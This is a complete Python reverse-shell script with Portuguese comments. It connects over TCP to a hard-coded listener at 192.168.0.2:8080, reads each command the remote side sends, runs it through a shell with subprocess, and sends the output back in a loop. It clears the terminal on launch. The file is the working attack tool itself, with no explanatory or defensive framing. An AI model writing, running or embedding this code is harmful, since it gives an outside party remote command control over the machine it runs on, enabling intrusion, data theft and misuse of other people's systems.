import socket
import subprocess
import os
import sys

def exec_command(command):
    """Executa um comando e retorna a saída."""
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return f"[x] ERRO ao executar o comando...\n{e.output.decode()}"

def reverse_shell():
    server_ip = "192.168.0.2"
    server_port = 8080

    # Cria um socket TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcpsock:
        try:
            tcpsock.connect((server_ip, server_port))
            while True:
                # Recebe o comando do servidor
                command = tcpsock.recv(1024).decode()
                if not command:
                    break
                
                # Executa o comando e obtém a saída
                output = exec_command(command)
                
                # Envia a saída de volta ao servidor
                tcpsock.sendall(output.encode())
        except Exception as e:
            print(f"[x] ERRO: {e}")
            sys.exit(0)

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela
    reverse_shell()
